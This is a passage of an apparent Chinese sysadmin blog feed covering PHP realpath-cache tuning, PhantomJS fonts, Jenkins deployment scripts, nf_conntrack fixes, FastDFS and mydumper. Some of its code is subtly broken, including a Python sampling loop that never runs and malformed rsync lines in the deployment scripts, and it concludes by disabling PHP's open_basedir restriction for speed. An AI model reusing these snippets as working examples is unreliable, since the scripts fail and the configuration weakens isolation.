class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line">1.开启open_basedir</div><div class="line">Disable PHP&apos;s open_basedir directive so that the realpath cache won&apos;t be</div><div class="line">; disabled.</div><div class="line">; Remember, turbo_realpath will set this option later to the</div><div class="line">; realpath_cache_basedir value.</div><div class="line">open_basedir = &quot;/data/wwwroot/run/:/tmp/&quot;</div><div class="line"></div><div class="line">2.使用realpath_turbo进行优化,开启open_basedir时,依然可以使用realpath cache;</div><div class="line">安装realpath_turbo扩展https://github.com/Whissi/realpath_turbo,修改php.ini</div><div class="line">#you have to load the extension first</div><div class="line">extension=turbo_realpath.so</div><div class="line">; realpath_turbo security mode</div><div class="line">; Possible values:</div><div class="line">;   0 - Ignore potential security issues</div><div class="line">;   1 - Disable dangerous PHP functions (link,symlink)</div><div class="line">realpath_cache_security = 1</div><div class="line"></div><div class="line">; Set realpath_cache_basedir to whatever you want to set open_basedir to</div><div class="line">realpath_cache_basedir = &quot;/data/wwwroot/run/:/tmp/&quot;</div><div class="line"></div><div class="line">; Disable PHP&apos;s open_basedir directive so that the realpath cache won&apos;t be</div><div class="line">; disabled.</div><div class="line">; Remember, turbo_realpath will set this option later to the</div><div class="line">; realpath_cache_basedir value.</div><div class="line">open_basedir = &quot;&quot;</div><div class="line"></div><div class="line">realpath_cache_size = 20m</div><div class="line">; Duration of time, in seconds for which to cache realpath information for a given</div><div class="line">; file or directory. For systems with rarely changing files, consider increasing this</div><div class="line">; value.</div><div class="line">; http://php.net/realpath-cache-ttl</div><div class="line">realpath_cache_ttl = 43200</div><div class="line"></div><div class="line">注意事项：使用realpath_turbo时,要关闭创建和操作符号链接的函数，否则会绕过 open_basedir安全限制,但依然不推荐在多虚拟主机环境使用</div><div class="line"></div><div class="line">3.关闭open_basedir,增加realpath缓存</div><div class="line">realpath_cache_size = 20m</div><div class="line">; Duration of time, in seconds for which to cache realpath information for a given</div><div class="line">; file or directory. For systems with rarely changing files, consider increasing this</div><div class="line">; value.</div><div class="line">; http://php.net/realpath-cache-ttl</div><div class="line">realpath_cache_ttl = 43200</div></pre></td></tr></table></figure></p>
<p>写脚本分别采集三种环境下系统调用占CPU时间百分比(采集半小时)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">#*_* coding:utf-8 *_*</div><div class="line">import time</div><div class="line">import psutil</div><div class="line">import os</div><div class="line">end=1</div><div class="line">f = open(&apos;openbasedir.log&apos;,mode=&apos;w&apos;)</div><div class="line">f.write(&quot;%s\t\t%s\t\t\t%s\t\t%s\t\t%s&quot; % (&apos;id&apos;,&apos;time&apos;,&apos;sys_percent&apos;,&apos;hi&apos;,&apos;si&apos;) + &quot;\n&quot;)</div><div class="line">while end &gt;= 1800:</div><div class="line">    nowtime=time.strftime(&quot;%Y-%m-%d %H:%M:%S&quot;,time.localtime(time.time()))</div><div class="line">    ps = psutil.cpu_times_percent(interval=1)</div><div class="line">    data=&quot;%s\t\t%s\t\t%s\t\t%s\t\t%s&quot; % (end,nowtime,ps.system,ps.irq,ps.softirq)</div><div class="line">    f.write(data+os.linesep)</div><div class="line">    end +=1</div><div class="line">最终性能对比结果如图(横轴为采样id(s),纵轴为%sys占CPU时间比):</div></pre></td></tr></table></figure></p>
<p><a href="http://ow1schdt5.bkt.clouddn.com/2015/12/tongji.jpg" target="_blank" rel="external"><img src="http://ow1schdt5.bkt.clouddn.com/2015/12/tongji.jpg" alt="tongji"></a></p>
<h4 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h4><p>为了性能暂时关闭了open_basedir参数,开启realpath cache缓存,代码尽量少用include,require,include_once,require_once等</p>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[使用PhantomJS网页截图字体显示问题]]></title>
      <url>/2015/08/18/phantomjs-capture.html</url>
      <content type="html"><![CDATA[<h4 id="PhantomJS介绍"><a href="#PhantomJS介绍" class="headerlink" title="PhantomJS介绍"></a>PhantomJS介绍</h4><p>PhantomJS(<a href="http://phantomjs.org/" target="_blank" rel="external">http://phantomjs.org</a>是一个无界面的Webkit内核浏览器，内置JavaScript API,对DOM操作,CSS选择器,JSON,Canvas,SVG有非常快和原生的支持，可以用于页面自动化测试，网络监测，网页截图等,下载地址<a href="http://npm.taobao.org/mirrors/phantomjs" target="_blank" rel="external">http://npm.taobao.org/mirrors/phantomjs</a><br>在使用phantomjs截图过程中，发现没有文字信息，由于项目使用了微软雅黑，解决方法如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">yum -y install bitmap-fonts bitmap-fonts-cjk mkfontscale fontconfig </div><div class="line">mkdir /usr/share/fonts/win/ </div><div class="line">下载微软雅黑字体: </div><div class="line">wget https://nipao.googlecode.com/files/msyh.ttf -O /usr/share/fonts/win/msyh.ttf </div><div class="line">建立字体索引，更新字体缓存: </div><div class="line">cd /usr/share/fonts/win/ </div><div class="line">mkfontscale </div><div class="line">mkfontdir </div><div class="line">fc-cache</div></pre></td></tr></table></figure></p>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> PhantomJS </tag>
            
            <tag> PhantomJS字体 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[基于jenkins动态化参数化构建]]></title>
      <url>/2015/06/19/jks-dynamic-parameters.html</url>
      <content type="html"><![CDATA[<p>由于上一篇是通过触发git操作来实现自动化构建和发布，回滚和发布不太可控，可以采用动态参数获取发布分支的方式方便发布和回滚</p>
<h4 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h4><blockquote>
<p>选择合适版本发布到合适的服务器环境（目前分支策略是，提测时创建发布分支release-<code>date  +%Y%m%d-%H%M%S</code>）</p>
</blockquote>
<h4 id="安装插件"><a href="#安装插件" class="headerlink" title="安装插件"></a>安装插件</h4><p>Dynamic Parameter Plug-in](<a href="https://wiki.jenkins-ci.org/display/JENKINS/Dynamic+Parameter+Plug-in" target="_blank" rel="external">https://wiki.jenkins-ci.org/display/JENKINS/Dynamic+Parameter+Plug-in</a>)</p>
<h4 id="设置-参数化构建过程"><a href="#设置-参数化构建过程" class="headerlink" title="设置 参数化构建过程"></a>设置 参数化构建过程</h4><p><a href="http://ow1schdt5.bkt.clouddn.com/2015/06/11.png" target="_blank" rel="external"><img src="http://ow1schdt5.bkt.clouddn.com/2015/06/11.png" alt="1"></a><img src="http://ow1schdt5.bkt.clouddn.com/2015/06/11.png" alt=""></p>
<h4 id="使用groovy脚本动态获取发布分支"><a href="#使用groovy脚本动态获取发布分支" class="headerlink" title="使用groovy脚本动态获取发布分支"></a>使用groovy脚本动态获取发布分支</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">def ver_keys = [ &apos;bash&apos;, &apos;-c&apos;, &apos;cd /gitrepos/project1; git pull&gt;/dev/null; git branch -a|grep remotes|grep release|cut -d &quot;/&quot; -f3|sort -r |head -10 &apos; ]</div><div class="line">ver_keys.execute().text.tokenize(&apos;\n&apos;)</div></pre></td></tr></table></figure>
<p>其他方式参考：<a href="http://birdinroom.blog.51cto.com/7740375/1404930" target="_blank" rel="external">http://birdinroom.blog.51cto.com/7740375/1404930</a></p>
<h4 id="构建脚本"><a href="#构建脚本" class="headerlink" title="构建脚本"></a>构建脚本</h4><p><img src="http://ow1schdt5.bkt.clouddn.com/2015/06/21.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">echo $release_version</div><div class="line">echo $deploy_server</div><div class="line">case $deploy_server in</div><div class="line">  test)</div><div class="line">       echo &quot;This server is $deploy_server -----test enviroment&quot;</div><div class="line">       cd /gitrepos/project1/</div><div class="line">       git checkout $release_version</div><div class="line">       git pull origin $release_version</div><div class="line">       rsync -avH --delete --progress  --exclude=robots.txt --exclude=.gitignore  --exclude=.git --exclude=.DS_Store --exclude=&quot;*.tar&quot;    /gitrepos/project1/  /gitrepos/project1/               </div><div class="line">         ;;</div><div class="line">  prod)</div><div class="line">       echo &quot;This server is $deploy_server  ------production enviroment&quot;</div><div class="line">       cd  /gitrepos/project1/</div><div class="line">       git checkout $release_version</div><div class="line">       git pull origin $release_version</div><div class="line">       rsync -avH --delete --progress  --exclude=robots.txt --exclude=.gitignore  --exclude=.git --exclude=.DS_Store --exclude=&quot;*.tar&quot;  &apos;-e ssh -p 22000&apos; /gitrepos/project1/  www@node1.simlinux.com:/gitrepos/project1/ </div><div class="line">          ;;</div><div class="line">  *)</div><div class="line">          exit</div><div class="line">          ;;</div><div class="line">esac</div></pre></td></tr></table></figure></p>
<h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4><p><img src="http://ow1schdt5.bkt.clouddn.com/2015/06/31.png" alt=""></p>
<p><img src="http://ow1schdt5.bkt.clouddn.com/2015/06/sdf.png" alt=""></p>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> choice </tag>
            
            <tag> groovy </tag>
            
            <tag> jenkins </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[基于jenkins+gitlab+redmine构建持续集成环境（一）]]></title>
      <url>/2015/06/19/jks-gitlab-redmine-first.html</url>
      <content type="html"><![CDATA[<h4 id="用途说明"><a href="#用途说明" class="headerlink" title="用途说明"></a>用途说明</h4><blockquote>
<p>jenkins：用于自动化测试构建发布<br>gitlab：作为代码托管服务<br>redmine：作为项目管理和bug管理，通过jenkins整合redmine实现自动化发布提醒<br>系列文章只针对jenkins自身使用做详细介绍，gitlab/redmine可使用bitnami stacks一键部署（<a href="https://bitnami.com/stack/gitlab、https://bitnami.com/stack/redmine）或者使用docker容器来部署环境（后期文章将对其详细介绍）" target="_blank" rel="external">https://bitnami.com/stack/gitlab、https://bitnami.com/stack/redmine）或者使用docker容器来部署环境（后期文章将对其详细介绍）</a></p>
<h4 id="环境说明"><a href="#环境说明" class="headerlink" title="环境说明"></a>环境说明</h4><p>PHP项目（jenkins安装初始化略）</p>
</blockquote>
<h4 id="创建简单的集成项目"><a href="#创建简单的集成项目" class="headerlink" title="创建简单的集成项目"></a>创建简单的集成项目</h4><p>点击<strong>新建</strong> –<strong>Item名称：项目1</strong>– 勾选<strong>构建一个自由风格的软件项目</strong></p>
<p><img src="http://ow1schdt5.bkt.clouddn.com/2015/06/1.png" alt=""><br><strong>添加代码库</strong></p>
<p><img src="http://ow1schdt5.bkt.clouddn.com/2015/06/2.png" alt=""><br><strong>触发构建策略</strong></p>
<p><img src="http://ow1schdt5.bkt.clouddn.com/2015/06/3.png" alt=""><br><strong>添加构建脚本</strong></p>
<p><img src="http://ow1schdt5.bkt.clouddn.com/2015/06/4.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">release.sh</div><div class="line">#!/bin/bash</div><div class="line">cd /gitrepos/project1</div><div class="line">git checkout master</div><div class="line">git pull origin master</div><div class="line">rsync -avH  --delete --progress  --exclude=robots.txt --exclude=.gitignore --exclude=database.php  --exclude=.git --exclude=.DS_Store --exclude=&quot;*.tar&quot;  &apos;-e ssh -p 11000&apos;  cd /gitrepos/project1</div><div class="line">www@project1.node1.simlinux.com:/data/wwwroot/project1/</div></pre></td></tr></table></figure></p>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> jenkins </tag>
            
            <tag> gitlab </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[解决nf_conntrack: table full问题方法]]></title>
      <url>/2015/04/14/conntrack-table-full.html</url>
      <content type="html"><![CDATA[<p>在web服务器上经常会出现nf_conntrack: table full的问题，解决方法有三个：</p>
<p><strong>1.优化nf_conntrack模块相关内核参数（可作为临时解决办法，治标不治本）</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">#加大 ip_conntrack_max 值</div><div class="line">net.ipv4.ip_conntrack_max = 393216</div><div class="line">net.ipv4.netfilter.ip_conntrack_max = 393216</div><div class="line">#降低 ip_conntrack timeout时间</div><div class="line">net.ipv4.netfilter.ip_conntrack_tcp_timeout_established = 300</div><div class="line">net.ipv4.netfilter.ip_conntrack_tcp_timeout_time_wait = 120</div><div class="line">net.ipv4.netfilter.ip_conntrack_tcp_timeout_close_wait = 60</div><div class="line">net.ipv4.netfilter.ip_conntrack_tcp_timeout_fin_wait = 120</div></pre></td></tr></table></figure></p>
<p><strong>2.移除nf_conntrack模块</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">[root@git ~]# lsmod | egrep &apos;ip_tables|conntrack&apos;</div><div class="line">nf_conntrack_ipv4       9506  2 </div><div class="line">nf_defrag_ipv4          1483  1 nf_conntrack_ipv4</div><div class="line">nf_conntrack           79758  3 xt_NOTRACK,nf_conntrack_ipv4,xt_state</div><div class="line">ip_tables              17831  2 iptable_raw,iptable_filter</div></pre></td></tr></table></figure></p>
<p>A.先将/etc/sysconfig/iptables 中包含state的语句移除，service  iptables restart<br>B.移除模块<br>modprobe -r xt_NOTRACK nf_conntrack_netbios_ns nf_conntrack_ipv4 xt_state<br>modprobe -r nf_conntrack</p>
<p><strong>3.使用raw表对特定端口访问不进行跟踪（推荐）</strong><br>4个表的优先级由高到低的顺序为:raw–&gt;mangle–&gt;nat–&gt;filter</p>
<p><a href="http://ow1schdt5.bkt.clouddn.com/2015/04/iptables.jpg" target="_blank" rel="external"><img src="http://ow1schdt5.bkt.clouddn.com/2015/04/iptables.jpg" alt=""><img src="http://ow1schdt5.bkt.clouddn.com/2015/04/iptables.jpg" alt="iptables"></a><a href="http://ow1schdt5.bkt.clouddn.com/2015/04/iptables.jpg" target="_blank" rel="external"><img src="http://ow1schdt5.bkt.clouddn.com/2015/04/iptables.jpg" alt="iptables"></a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">iptables -A INPUT -m state --state RELATED,ESTABLISHED, UNTRACKED -j ACCEPT</div><div class="line">iptables -t raw -A PREROUTING -p tcp -m multiport --dports 80,443 -j NOTRACK</div><div class="line">iptables -t raw -A PREROUTING -p tcp -m multiport --sports 80,443 -j NOTRACK</div><div class="line">iptables -t raw -A OUTPUT -p tcp -m multiport --dports 80,443 -j NOTRACK</div><div class="line">iptables -t raw -A OUTPUT -p tcp -m multiport --sports 80,443 -j NOTRACK</div></pre></td></tr></table></figure></p>
<p>通过观察cat /proc/net/nf_conntrack条目来测试是否更改生效</p>
<p><strong>参考文档：</strong></p>
<blockquote>
<p><a href="http://www.361way.com/%E5%86%8D%E7%9C%8Bnf_conntrack-table-full%E9%97%AE%E9%A2%98/2404.html" target="_blank" rel="external">http://www.361way.com/%E5%86%8D%E7%9C%8Bnf_conntrack-table-full%E9%97%AE%E9%A2%98/2404.html</a><br><a href="https://wiki.khnet.info/index.php/Conntrack_tuning" target="_blank" rel="external">https://wiki.khnet.info/index.php/Conntrack_tuning</a><br><a href="https://timanovsky.wordpress.com/2009/04/10/tuning-linux-firewall-connection-tracker-ip_conntrack/" target="_blank" rel="external">https://timanovsky.wordpress.com/2009/04/10/tuning-linux-firewall-connection-tracker-ip_conntrack/</a></p>
</blockquote>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> nf_conntrack </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[FastDFS分布式存储实战]]></title>
      <url>/2015/02/09/fastdfs-best-practice.html</url>
      <content type="html"><![CDATA[<p><a href="http://blog.simlinux.com/books/FastDFS.pdf" target="_blank" rel="external">《FastDFS分布式存储实战》</a></p>
<h4 id="技术选型"><a href="#技术选型" class="headerlink" title="技术选型"></a>技术选型</h4><h4 id="FastDFS相关组件及原理"><a href="#FastDFS相关组件及原理" class="headerlink" title="FastDFS相关组件及原理"></a>FastDFS相关组件及原理</h4><h5 id="FastDFS介绍"><a href="#FastDFS介绍" class="headerlink" title="FastDFS介绍"></a>FastDFS介绍</h5><h5 id="FastDFS架构"><a href="#FastDFS架构" class="headerlink" title="FastDFS架构"></a>FastDFS架构</h5><h5 id="FastDFS工作流程"><a href="#FastDFS工作流程" class="headerlink" title="FastDFS工作流程"></a>FastDFS工作流程</h5><h5 id="上传"><a href="#上传" class="headerlink" title="上传"></a>上传</h5><h5 id="同步机制"><a href="#同步机制" class="headerlink" title="同步机制"></a>同步机制</h5><h5 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h5><h5 id="文件合并原理"><a href="#文件合并原理" class="headerlink" title="文件合并原理"></a>文件合并原理</h5><h4 id="实验环境说明"><a href="#实验环境说明" class="headerlink" title="实验环境说明"></a>实验环境说明</h4><h4 id="FastDFS部署"><a href="#FastDFS部署" class="headerlink" title="FastDFS部署"></a>FastDFS部署</h4><h5 id="初始化系统"><a href="#初始化系统" class="headerlink" title="初始化系统"></a>初始化系统</h5><h5 id="安装libfastcommon和fastdfs"><a href="#安装libfastcommon和fastdfs" class="headerlink" title="安装libfastcommon和fastdfs"></a>安装libfastcommon和fastdfs</h5><h5 id="storage-server安装nginx"><a href="#storage-server安装nginx" class="headerlink" title="storage server安装nginx"></a>storage server安装nginx</h5><h5 id="配置mod-fastdfs-conf"><a href="#配置mod-fastdfs-conf" class="headerlink" title="配置mod_fastdfs.conf"></a>配置mod_fastdfs.conf</h5><h5 id="配置下载网关"><a href="#配置下载网关" class="headerlink" title="配置下载网关"></a>配置下载网关</h5><h5 id="tracker和storage目录结构"><a href="#tracker和storage目录结构" class="headerlink" title="tracker和storage目录结构"></a>tracker和storage目录结构</h5><h5 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h5><h4 id="高级功能"><a href="#高级功能" class="headerlink" title="高级功能"></a>高级功能</h4><h5 id="防盗链"><a href="#防盗链" class="headerlink" title="防盗链"></a>防盗链</h5><h5 id="在线扩容"><a href="#在线扩容" class="headerlink" title="在线扩容"></a>在线扩容</h5><h5 id="增加group"><a href="#增加group" class="headerlink" title="增加group"></a>增加group</h5><h5 id="组内增加storage-server"><a href="#组内增加storage-server" class="headerlink" title="组内增加storage server"></a>组内增加storage server</h5><h5 id="故障磁盘移除"><a href="#故障磁盘移除" class="headerlink" title="故障磁盘移除"></a>故障磁盘移除</h5><h5 id="文件去重存储"><a href="#文件去重存储" class="headerlink" title="文件去重存储"></a>文件去重存储</h5><h5 id="自定义文件名"><a href="#自定义文件名" class="headerlink" title="自定义文件名"></a>自定义文件名</h5><h5 id="拼接url方式"><a href="#拼接url方式" class="headerlink" title="拼接url方式"></a>拼接url方式</h5><h5 id="使用redis"><a href="#使用redis" class="headerlink" title="使用redis"></a>使用redis</h5><h5 id="缩略图"><a href="#缩略图" class="headerlink" title="缩略图"></a>缩略图</h5><h5 id="清除缓存"><a href="#清除缓存" class="headerlink" title="清除缓存"></a>清除缓存</h5><h4 id="FastDFS开发API使用"><a href="#FastDFS开发API使用" class="headerlink" title="FastDFS开发API使用"></a>FastDFS开发API使用</h4><h4 id="性能优化及安全"><a href="#性能优化及安全" class="headerlink" title="性能优化及安全"></a>性能优化及安全</h4><h5 id="系统方面"><a href="#系统方面" class="headerlink" title="系统方面"></a>系统方面</h5><h5 id="FastDFS方面"><a href="#FastDFS方面" class="headerlink" title="FastDFS方面"></a>FastDFS方面</h5><h5 id="安全配置"><a href="#安全配置" class="headerlink" title="安全配置"></a>安全配置</h5><h4 id="监控"><a href="#监控" class="headerlink" title="监控"></a>监控</h4><h4 id="FastDFS常见问题"><a href="#FastDFS常见问题" class="headerlink" title="FastDFS常见问题"></a>FastDFS常见问题</h4>]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> FastDFS </tag>
            
            <tag> FastDHT </tag>
            
            <tag> 分布式存储 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[FastDFS角色配置参数思维导图]]></title>
      <url>/2015/01/29/fastdfs-xmind.html</url>
      <content type="html"><![CDATA[<p><a href="http://ow1schdt5.bkt.clouddn.com/2015/01/FastDFS%E8%A7%92%E8%89%B2%E9%85%8D%E7%BD%AE%E5%8F%82%E6%95%B0%E5%AF%BC%E5%9B%BE.jpg" target="_blank" rel="external"><img src="http://ow1schdt5.bkt.clouddn.com/2015/01/FastDFS%E8%A7%92%E8%89%B2%E9%85%8D%E7%BD%AE%E5%8F%82%E6%95%B0%E5%AF%BC%E5%9B%BE.jpg" alt=""></a></p>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> FastDFS </tag>
            
            <tag> storage server </tag>
            
            <tag> tracker </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[MySQL多线程逻辑备份工具之mydumper]]></title>
      <url>/2015/01/15/mysqldumper.html</url>
      <content type="html"><![CDATA[<h4 id="下载安装"><a href="#下载安装" class="headerlink" title="下载安装"></a><strong>下载安装</strong></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">yum -y install cmake glib2 pcre pcre-devel mysql-devel</div><div class="line">wget [https://launchpad.net/mydumper/0.6/0.6.2/+download/mydumper-0.6.2.tar.gz](https://launchpad.net/mydumper/0.6/0.6.2/+download/mydumper-0.6.2.tar.gz)</div><div class="line">tar xf  mydumper-0.6.2.tar.gz</div><div class="line">cd mydumper-0.6.2</div><div class="line">cmake .</div><div class="line">make &amp;&amp; make install</div></pre></td></tr></table></figure>
<p>注释：如果只要帮助可以这样编译make doc_html<br>安装之后生成两个二进制命令/usr/local/bin/mydumper（备份）和/usr/local/bin/myloader（恢复）</p>
<h4 id="mydumper特性"><a href="#mydumper特性" class="headerlink" title="mydumper特性"></a><strong>mydumper特性</strong></h4><ul>
<li>多线程备份，生成多个备份文件</li>
<li>针对MyISAM表加读锁，会阻塞DML语句</li>
<li>保证备份数据一致性</li>
<li>支持文件压缩和导出binlog</li>
<li>支持多线程恢复</li>
<li>支持守护进程模式，定时快照和连续二进制日志</li>
<li>支持正则匹配</li>
<li>恢复支持是否启用binlog及指定事物的大小(多少insert)</li>
<li>无法备份视图和触发器</li>
<li>备份整库时可用备份存储过程和函数，单库备份等情况无法对其进行备份</li>
</ul>
<h4 id="mydumper备份机制"><a href="#mydumper备份机制" class="headerlink" title="mydumper备份机制"></a><strong>mydumper备份机制</strong></h4><p><img src="http://ow1schdt5.bkt.clouddn.com/2015/01/mydumper.png" alt=""></p>
<h5 id="主要步骤概括"><a href="#主要步骤概括" class="headerlink" title="主要步骤概括"></a><strong>主要步骤概括</strong></h5><ol>
<li>主线程 FLUSH TABLES WITH READ LOCK, 施加全局只读锁，以阻止DML语句写入，保证数据的一致性</li>
<li>读取当前时间点的二进制日志文件名和日志写入的位置并记录在metadata文件中，以供即使点恢复使用</li>
<li>N个（线程数可以指定，默认是4）dump线程 START TRANSACTION WITH CONSISTENT SNAPSHOT; 开启读一致的事物</li>
<li>dump non-InnoDB tables, 首先导出非事物引擎的表</li>
<li>主线程 UNLOCK TABLES 非事物引擎备份完后，释放全局只读锁</li>
<li>dump InnoDB tables, 基于事物导出InnoDB表</li>
<li>事物结束</li>
</ol>
<h5 id="备份所生成的文件"><a href="#备份所生成的文件" class="headerlink" title="备份所生成的文件"></a><strong>备份所生成的文件</strong></h5><ol>
<li>所有的备份文件在一个目录中，目录可以自己指定</li>
<li><p>目录中包含一个metadata文件<br>记录了备份数据库在备份时间点的二进制日志文件名，日志的写入位置，<br>如果是在从库进行备份，还会记录备份时同步至从库的二进制日志文件及写入位置</p>
</li>
<li><p>每个表有两个备份文件：</p>
</li>
</ol>
<p>database.table-schema.sql 表结构文件<br>database.table.sql 表数据文件<br>如果对表文件分片，将生成多个备份数据文件，可以指定行数或指定大小分片</p>
<h4 id="mydumper参数详解"><a href="#mydumper参数详解" class="headerlink" title="mydumper参数详解"></a><strong>mydumper参数详解</strong></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line">-B, --database              要备份的数据库，不指定则备份所有库</div><div class="line">-T, --tables-list           需要备份的表，名字用逗号隔开</div><div class="line">-o, --outputdir             备份文件输出的目录</div><div class="line">-s, --statement-size        生成的insert语句的字节数，默认1000000</div><div class="line">-r, --rows                  将表按行分块时，指定的块行数，指定这个选项会关闭 --chunk-filesize</div><div class="line">-F, --chunk-filesize        将表按大小分块时，指定的块大小，单位是 MB</div><div class="line">-c, --compress              压缩输出文件</div><div class="line">-e, --build-empty-files     如果表数据是空，还是产生一个空文件（默认无数据则只有表结构文件）</div><div class="line">-x, --regex                 是同正则表达式匹配 &apos;db.table&apos;</div><div class="line">-i, --ignore-engines        忽略的存储引擎，用逗号分割</div><div class="line">-m, --no-schemas            不备份表结构</div><div class="line">-k, --no-locks              不使用临时共享只读锁，使用这个选项会造成数据不一致</div><div class="line">--less-locking              减少对InnoDB表的锁施加时间（这种模式的机制下文详解）</div><div class="line">-l, --long-query-guard      设定阻塞备份的长查询超时时间，单位是秒，默认是60秒（超时后默认mydumper将会退出）</div><div class="line">--kill-long-queries         杀掉长查询 (不退出)</div><div class="line">-b, --binlogs               导出binlog</div><div class="line">-D, --daemon                启用守护进程模式，守护进程模式以某个间隔不间断对数据库进行备份</div><div class="line">-I, --snapshot-interval     dump快照间隔时间，默认60s，需要在daemon模式下</div><div class="line">-L, --logfile               使用的日志文件名(mydumper所产生的日志), 默认使用标准输出</div><div class="line">--tz-utc                    跨时区是使用的选项，不解释了</div><div class="line">--skip-tz-utc               同上</div><div class="line">--use-savepoints            使用savepoints来减少采集metadata所造成的锁时间，需要 SUPER 权限</div><div class="line">--success-on-1146           Not increment error count and Warning instead of Critical in case of table doesn&apos;t exist</div><div class="line">-h, --host                  连接的主机名</div><div class="line">-u, --user                  备份所使用的用户</div><div class="line">-p, --password              密码</div><div class="line">-P, --port                  端口</div><div class="line">-S, --socket                使用socket通信时的socket文件</div><div class="line">-t, --threads               开启的备份线程数，默认是4</div><div class="line">-C, --compress-protocol     压缩与mysql通信的数据</div><div class="line">-V, --version               显示版本号</div><div class="line">-v, --verbose               输出信息模式, 0 = silent, 1 = errors, 2 = warnings, 3 = info, 默认为 2&lt;/pre&gt;</div></pre></td></tr></table></figure>
<h4 id="myloader参数详解"><a href="#myloader参数详解" class="headerlink" title="myloader参数详解"></a><strong>myloader参数详解</strong></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">-d, --directory                   备份文件的目录</div><div class="line">-q, --queries-per-transaction     每次事物执行的查询数量，默认是1000</div><div class="line">-o, --overwrite-tables            如果要恢复的表存在，则先drop掉该表，使用该参数，需要备份时候要备份表结构</div><div class="line">-B, --database                    需要还原的数据库</div><div class="line">-e, --enable-binlog               启用还原数据的二进制日志</div><div class="line">-h, --host                        主机</div><div class="line">-u, --user                        还原的用户</div><div class="line">-p, --password                    密码</div><div class="line">-P, --port                        端口</div><div class="line">-S, --socket                      socket文件</div><div class="line">-t, --threads                     还原所使用的线程数，默认是4</div><div class="line">-C, --compress-protocol           压缩协议</div><div 